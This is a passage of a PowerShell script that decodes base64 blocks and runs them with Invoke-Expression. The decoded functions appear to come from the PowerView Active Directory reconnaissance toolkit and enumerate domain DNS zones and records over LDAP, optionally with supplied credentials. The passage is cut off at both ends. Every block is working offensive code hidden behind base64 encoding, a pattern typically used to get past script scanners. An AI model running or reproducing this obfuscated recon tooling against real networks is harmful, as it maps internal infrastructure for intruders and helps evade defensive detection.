VjdG9yeVNlYXJjaGVyKCREb21haW5PYmplY3QpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlcihbQURTSV0kU2VhcmNoU3RyaW5nKQogICAgICAgIH0KICAgICAgICAkU2VhcmNoZXIuUGFnZVNpemUgPSAkUmVzdWx0UGFnZVNpemUKICAgICAgICAkU2VhcmNoZXIuU2VhcmNoU2NvcGUgPSAkU2VhcmNoU2NvcGUKICAgICAgICAkU2VhcmNoZXIuQ2FjaGVSZXN1bHRzID0gJEZhbHNlCiAgICAgICAgJFNlYXJjaGVyLlJlZmVycmFsQ2hhc2luZyA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuUmVmZXJyYWxDaGFzaW5nT3B0aW9uXTo6QWxsCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyLlNlcnZlclRpbWVMaW1pdCA9ICRTZXJ2ZXJUaW1lTGltaXQKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyLlRvbWJzdG9uZSA9ICRUcnVlCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgewogICAgICAgICAgICAkU2VhcmNoZXIuZmlsdGVyID0gJExEQVBGaWx0ZXIKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7CiAgICAgICAgICAgICRTZWFyY2hlci5TZWN1cml0eU1hc2tzID0gU3dpdGNoICgkU2VjdXJpdHlNYXNrcykgewogICAgICAgICAgICAgICAgJ0RhY2wnIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6RGFjbCB9CiAgICAgICAgICAgICAgICAnR3JvdXAnIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6R3JvdXAgfQogICAgICAgICAgICAgICAgJ05vbmUnIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6Tm9uZSB9CiAgICAgICAgICAgICAgICAnT3duZXInIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6T3duZXIgfQogICAgICAgICAgICAgICAgJ1NhY2wnIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6U2FjbCB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7CiAgICAgICAgICAgICRQcm9wZXJ0aWVzVG9Mb2FkID0gJFByb3BlcnRpZXN8IEZvckVhY2gtT2JqZWN0IHsgJF8uU3BsaXQoJywnKSB9CiAgICAgICAgICAgICROdWxsID0gJFNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCRQcm9wZXJ0aWVzVG9Mb2FkKSkKICAgICAgICB9CiAgICAgICAgJFNlYXJjaGVyCiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQ29udmVydC1ETlNSZWNvcmQgewogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0J5dGVbXV0KICAgICAgICAkRE5TUmVjb3JkCiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgZnVuY3Rpb24gR2V0LU5hbWUgewogICAgICAgICAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VPdXRwdXRUeXBlQ29ycmVjdGx5JywgJycpXQogICAgICAgICAgICBbQ21kbGV0QmluZGluZygpXQogICAgICAgICAgICBQYXJhbSgKICAgICAgICAgICAgICAgIFtCeXRlW11dCiAgICAgICAgICAgICAgICAkUmF3CiAgICAgICAgICAgICkKICAgICAgICAgICAgW0ludF0kTGVuZ3RoID0gJFJhd1swXQogICAgICAgICAgICBbSW50XSRTZWdtZW50cyA9ICRSYXdbMV0KICAgICAgICAgICAgW0ludF0kSW5kZXggPSAgMgogICAgICAgICAgICBbU3RyaW5nXSROYW1lICA9ICcnCiAgICAgICAgICAgIHdoaWxlICgkU2VnbWVudHMtLSAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgW0ludF0kU2VnbWVudExlbmd0aCA9ICRSYXdbJEluZGV4KytdCiAgICAgICAgICAgICAgICB3aGlsZSAoJFNlZ21lbnRMZW5ndGgtLSAtZ3QgMCkgewogICAgICAgICAgICAgICAgICAgICROYW1lICs9IFtDaGFyXSRSYXdbJEluZGV4KytdCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkTmFtZSArPSAiLiIKICAgICAgICAgICAgfQogICAgICAgICAgICAkTmFtZQogICAgICAgIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgICRSRGF0YVR5cGUgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MTYoJEROU1JlY29yZCwgMikKICAgICAgICAkVXBkYXRlZEF0U2VyaWFsID0gW0JpdENvbnZlcnRlcl06OlRvVUludDMyKCRETlNSZWNvcmQsIDgpCiAgICAgICAgJFRUTFJhdyA9ICRETlNSZWNvcmRbMTIuLjE1XQogICAgICAgICROdWxsID0gW2FycmF5XTo6UmV2ZXJzZSgkVFRMUmF3KQogICAgICAgICRUVEwgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MzIoJFRUTFJhdywgMCkKICAgICAgICAkQWdlID0gW0JpdENvbnZlcnRlcl06OlRvVUludDMyKCRETlNSZWNvcmQsIDIwKQogICAgICAgIGlmICgkQWdlIC1uZSAwKSB7CiAgICAgICAgICAgICRUaW1lU3RhbXAgPSAoKEdldC1EYXRlIC1ZZWFyIDE2MDEgLU1vbnRoIDEgLURheSAxIC1Ib3VyIDAgLU1pbnV0ZSAwIC1TZWNvbmQgMCkuQWRkSG91cnMoJGFnZSkpLlRvU3RyaW5nKCkKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRUaW1lU3RhbXAgPSAnW3N0YXRpY10nCiAgICAgICAgfQogICAgICAgICRETlNSZWNvcmRPYmplY3QgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgaWYgKCRSRGF0YVR5cGUgLWVxIDEpIHsKICAgICAgICAgICAgJElQID0gInswfS57MX0uezJ9LnszfSIgLWYgJEROU1JlY29yZFsyNF0sICRETlNSZWNvcmRbMjVdLCAkRE5TUmVjb3JkWzI2XSwgJEROU1JlY29yZFsyN10KICAgICAgICAgICAgJERhdGEgPSAkSVAKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnQScKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUkRhdGFUeXBlIC1lcSAyKSB7CiAgICAgICAgICAgICROU05hbWUgPSBHZXQtTmFtZSAkRE5TUmVjb3JkWzI0Li4kRE5TUmVjb3JkLmxlbmd0aF0KICAgICAgICAgICAgJERhdGEgPSAkTlNOYW1lCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ05TJwogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRSRGF0YVR5cGUgLWVxIDUpIHsKICAgICAgICAgICAgJEFsaWFzID0gR2V0LU5hbWUgJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdCiAgICAgICAgICAgICREYXRhID0gJEFsaWFzCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ0NOQU1FJwogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRSRGF0YVR5cGUgLWVxIDYpIHsKICAgICAgICAgICAgJERhdGEgPSAkKFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXSkpCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ1NPQScKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUkRhdGFUeXBlIC1lcSAxMikgewogICAgICAgICAgICAkUHRyID0gR2V0LU5hbWUgJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdCiAgICAgICAgICAgICREYXRhID0gJFB0cgogICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdQVFInCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFJEYXRhVHlwZSAtZXEgMTMpIHsKICAgICAgICAgICAgJERhdGEgPSAkKFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXSkpCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ0hJTkZPJwogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRSRGF0YVR5cGUgLWVxIDE1KSB7CiAgICAgICAgICAgICREYXRhID0gJChbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkRE5TUmVjb3JkWzI0Li4kRE5TUmVjb3JkLmxlbmd0aF0pKQogICAgICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1JlY29yZFR5cGUnICdNWCcKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUkRhdGFUeXBlIC1lcSAxNikgewogICAgICAgICAgICBbc3RyaW5nXSRUWFQgID0gJycKICAgICAgICAgICAgW2ludF0kU2VnbWVudExlbmd0aCA9ICRETlNSZWNvcmRbMjRdCiAgICAgICAgICAgICRJbmRleCA9IDI1CiAgICAgICAgICAgIHdoaWxlICgkU2VnbWVudExlbmd0aC0tIC1ndCAwKSB7CiAgICAgICAgICAgICAgICAkVFhUICs9IFtjaGFyXSRETlNSZWNvcmRbJGluZGV4KytdCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJERhdGEgPSAkVFhUCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ1RYVCcKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUkRhdGFUeXBlIC1lcSAyOCkgewogICAgICAgICAgICAkRGF0YSA9ICQoW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdKSkKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnQUFBQScKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUkRhdGFUeXBlIC1lcSAzMykgewogICAgICAgICAgICAkRGF0YSA9ICQoW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEROU1JlY29yZFsyNC4uJEROU1JlY29yZC5sZW5ndGhdKSkKICAgICAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdSZWNvcmRUeXBlJyAnU1JWJwogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJERhdGEgPSAkKFtTeXN0ZW0uQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRETlNSZWNvcmRbMjQuLiRETlNSZWNvcmQubGVuZ3RoXSkpCiAgICAgICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUmVjb3JkVHlwZScgJ1VOS05PV04nCiAgICAgICAgfQogICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXBkYXRlZEF0U2VyaWFsJyAkVXBkYXRlZEF0U2VyaWFsCiAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdUVEwnICRUVEwKICAgICAgICAkRE5TUmVjb3JkT2JqZWN0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0FnZScgJEFnZQogICAgICAgICRETlNSZWNvcmRPYmplY3QgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVGltZVN0YW1wJyAkVGltZVN0YW1wCiAgICAgICAgJEROU1JlY29yZE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEYXRhJyAkRGF0YQogICAgICAgICRETlNSZWNvcmRPYmplY3QKICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkROU1pvbmUgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuRE5TWm9uZScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkUHJvcGVydGllcywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnTERBUEZpbHRlcicgPSAnKG9iamVjdENsYXNzPWRuc1pvbmUpJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkRE5TU2VhcmNoZXIxID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgIGlmICgkRE5TU2VhcmNoZXIxKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZpbmRPbmUnXSkgeyAkUmVzdWx0cyA9ICRETlNTZWFyY2hlcjEuRmluZE9uZSgpICB9CiAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRETlNTZWFyY2hlcjEuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRPdXQgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkgJ1pvbmVOYW1lJyAkT3V0Lm5hbWUKICAgICAgICAgICAgICAgICRPdXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkROU1pvbmUnKQogICAgICAgICAgICAgICAgJE91dAogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkRE5TU2VhcmNoZXIxLmRpc3Bvc2UoKQogICAgICAgIH0KICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2VQcmVmaXgnXSA9ICdDTj1NaWNyb3NvZnRETlMsREM9RG9tYWluRG5zWm9uZXMnCiAgICAgICAgJEROU1NlYXJjaGVyMiA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICBpZiAoJEROU1NlYXJjaGVyMikgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRmluZE9uZSddKSB7ICRSZXN1bHRzID0gJEROU1NlYXJjaGVyMi5GaW5kT25lKCkgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJEROU1NlYXJjaGVyMi5GaW5kQWxsKCkgfQogICAgICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAkT3V0ID0gQ29udmVydC1MREFQUHJvcGVydHkgLVByb3BlcnRpZXMgJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnWm9uZU5hbWUnICRPdXQubmFtZQogICAgICAgICAgICAgICAgICAgICRPdXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkROU1pvbmUnKQogICAgICAgICAgICAgICAgICAgICRPdXQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgICAgIHRyeSB7ICRSZXN1bHRzLmRpc3Bvc2UoKSB9CiAgICAgICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkROU1pvbmVdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkROU1pvbmVdIEVycm9yIGFjY2Vzc2luZyAnQ049TWljcm9zb2Z0RE5TLERDPURvbWFpbkRuc1pvbmVzJyIKICAgICAgICAgICAgfQogICAgICAgICAgICAkRE5TU2VhcmNoZXIyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkROU1JlY29yZCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5ETlNSZWNvcmQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkWm9uZU5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMgPSAnbmFtZSxkaXN0aW5ndWlzaGVkbmFtZSxkbnNyZWNvcmQsd2hlbmNyZWF0ZWQsd2hlbmNoYW5nZWQnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIFBST0NFU1MgewogICAgICAgICRTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdMREFQRmlsdGVyJyA9ICcob2JqZWN0Q2xhc3M9ZG5zTm9kZSknCiAgICAgICAgICAgICdTZWFyY2hCYXNlUHJlZml4JyA9ICJEQz0kKCRab25lTmFtZSksQ049TWljcm9zb2Z0RE5TLERDPURvbWFpbkRuc1pvbmVzIgogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICRQcm9wZXJ0aWVzIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkRE5TU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgaWYgKCRETlNTZWFyY2hlcikgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkRE5TU2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJEROU1NlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRPdXQgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzIHwgU2VsZWN0LU9iamVjdCBuYW1lLGRpc3Rpbmd1aXNoZWRuYW1lLGRuc3JlY29yZCx3aGVuY3JlYXRlZCx3aGVuY2hhbmdlZAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnWm9uZU5hbWUnICRab25lTmFtZQogICAgICAgICAgICAgICAgICAgIGlmICgkT3V0LmRuc3JlY29yZCAtaXMgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5SZXN1bHRQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbl0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFJlY29yZCA9IENvbnZlcnQtRE5TUmVjb3JkIC1ETlNSZWNvcmQgJE91dC5kbnNyZWNvcmRbMF0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSZWNvcmQgPSBDb252ZXJ0LUROU1JlY29yZCAtRE5TUmVjb3JkICRPdXQuZG5zcmVjb3JkCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUmVjb3JkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRSZWNvcmQuUFNPYmplY3QuUHJvcGVydGllcyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ